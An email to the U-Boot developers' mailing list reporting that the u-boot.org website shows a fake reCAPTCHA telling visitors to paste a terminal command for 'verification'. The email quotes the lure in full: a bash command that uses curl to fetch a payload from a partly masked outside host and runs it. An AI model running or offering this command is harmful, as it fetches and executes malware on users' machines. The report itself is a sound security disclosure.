Return-Path: <u-boot-bounces@lists.denx.de>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from phobos.denx.de (phobos.denx.de [85.214.62.61])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 56A62E98E10
	for <u-boot@archiver.kernel.org>; Mon, 23 Feb 2026 10:02:34 +0000 (UTC)
Received: from h2850616.stratoserver.net (localhost [IPv6:::1])
	by phobos.denx.de (Postfix) with ESMTP id 0110783D17;
	Mon, 23 Feb 2026 11:02:23 +0100 (CET)
Authentication-Results: phobos.denx.de; dmarc=none (p=none dis=none) header.from=mkukri.xyz
Authentication-Results: phobos.denx.de; spf=pass smtp.mailfrom=u-boot-bounces@lists.denx.de
Authentication-Results: phobos.denx.de;
	dkim=fail reason="signature verification failed" (1024-bit key; unprotected) header.d=servermx.com header.i=@servermx.com header.b="U4qNcAtY";
	dkim=fail reason="signature verification failed" (1024-bit key) header.d=servermx.com header.i=@servermx.com header.b="U4qNcAtY";
	dkim-atps=neutral
Received: by phobos.denx.de (Postfix, from userid 109)
 id C767483D0F; Mon, 23 Feb 2026 06:32:26 +0100 (CET)
Received: from ns13.servermx.com (ns13.servermx.com [135.125.234.2])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits))
 (No client certificate requested)
 by phobos.denx.de (Postfix) with ESMTPS id A085880050
 for <u-boot@lists.denx.de>; Mon, 23 Feb 2026 06:32:24 +0100 (CET)
Authentication-Results: phobos.denx.de;
 dmarc=none (p=none dis=none) header.from=mkukri.xyz
Authentication-Results: phobos.denx.de; spf=pass smtp.mailfrom=km@mkukri.xyz
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=servermx.com; s=servermx; h=To:Date:Message-Id:Subject:Mime-Version:
 Content-Type:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=qjNhVUmmf7hfxOUFfqRvEfWbPtdYI20X1qheEMAAVWM=; b=U4qNcAtYT5oQfhfhFYPyME8pKZ
 aIhbGpncHt9ou2Z2d5q0KbBvLSjx+hwbz3VfnkDvZATS/r2KZ+/4ldOUaEU7TrEwqr26Ar4XqoZnJ
 8WN+eCl0b+f9SMzr/29F/sMKDlIKt5r4vrlgD6032Ry/+cYV3vEI9JMCaRIOumB5nTJ8=;
Received: by exim4;
	Mon, 23 Feb 2026 06:32:24 +0100
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=servermx.com; s=servermx; h=To:Date:Message-Id:Subject:Mime-Version:
 Content-Type:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=qjNhVUmmf7hfxOUFfqRvEfWbPtdYI20X1qheEMAAVWM=; b=U4qNcAtYT5oQfhfhFYPyME8pKZ
 aIhbGpncHt9ou2Z2d5q0KbBvLSjx+hwbz3VfnkDvZATS/r2KZ+/4ldOUaEU7TrEwqr26Ar4XqoZnJ
 8WN+eCl0b+f9SMzr/29F/sMKDlIKt5r4vrlgD6032Ry/+cYV3vEI9JMCaRIOumB5nTJ8=;
Received: by exim4;
	Mon, 23 Feb 2026 06:32:17 +0100
From: Mate Kukri <km@mkukri.xyz>
Mime-Version: 1.0 (Mac OS X Mail 16.0 \(3864.300.41.1.7\))
Subject: U-boot.org is spreading malware
Message-Id: <086E4FCB-379D-491A-A6DB-3CDC48775680@mkukri.xyz>
Date: Mon, 23 Feb 2026 05:31:58 +0000
To: u-boot@lists.denx.de
X-Mailer: Apple Mail (2.3864.300.41.1.7)
Feedback-ID: outgoingmessage:mkukri.xyz:ns12.servermx.com:servermx.com
X-Mailman-Approved-At: Mon, 23 Feb 2026 11:02:21 +0100
Content-Type: text/plain;
	charset=utf-8
Content-Transfer-Encoding: quoted-printable
X-Content-Filtered-By: Mailman/MimeDel 2.1.39
X-BeenThere: u-boot@lists.denx.de
X-Mailman-Version: 2.1.39
Precedence: list
List-Id: U-Boot discussion <u-boot.lists.denx.de>
List-Unsubscribe: <https://lists.denx.de/options/u-boot>,
 <mailto:u-boot-request@lists.denx.de?subject=unsubscribe>
List-Archive: <https://lists.denx.de/pipermail/u-boot/>
List-Post: <mailto:u-boot@lists.denx.de>
List-Help: <mailto:u-boot-request@lists.denx.de?subject=help>
List-Subscribe: <https://lists.denx.de/listinfo/u-boot>,
 <mailto:u-boot-request@lists.denx.de?subject=subscribe>
Errors-To: u-boot-bounces@lists.denx.de
Sender: "U-Boot" <u-boot-bounces@lists.denx.de>
X-Virus-Scanned: clamav-milter 0.103.8 at phobos.denx.de
X-Virus-Status: Clean

Dear Maintainers,

U-Boot.org <http://u-boot.org/> seems to be trying to social engineer =
visitors into executing potentially malicious code.

The website presents a seemingly fake re-Captcha upon visiting, which =
after ticking the box instructs the user to open their terminal and =
paste and execute a command from the clipboard for =E2=80=9Cverification".=


Said command curl-s some text from a network server and runs it as a =
bash command.

I have not done much analysis on the exact behaviour of the payload, but =
social engineering users into executing arbitrary local payload is not =
an acceptable way of doing web visitor verification.

An example of the clipboard payload I am told to execute (but did not) =
is (sub XXXXXXXX with microzen)
/bin/bash -c "$(curl -A 'Mac OS X 10_15_7' -fsSL =
'tl5mltkq.XXXXXXXX.digital/?=3Dcheck&&actmn=3DgTGzPBzHSGwagnVq')"; echo =
""BotGuard: Answer the protector challenge. Ref: 15978=20

Best regards,
Mate Kukri=
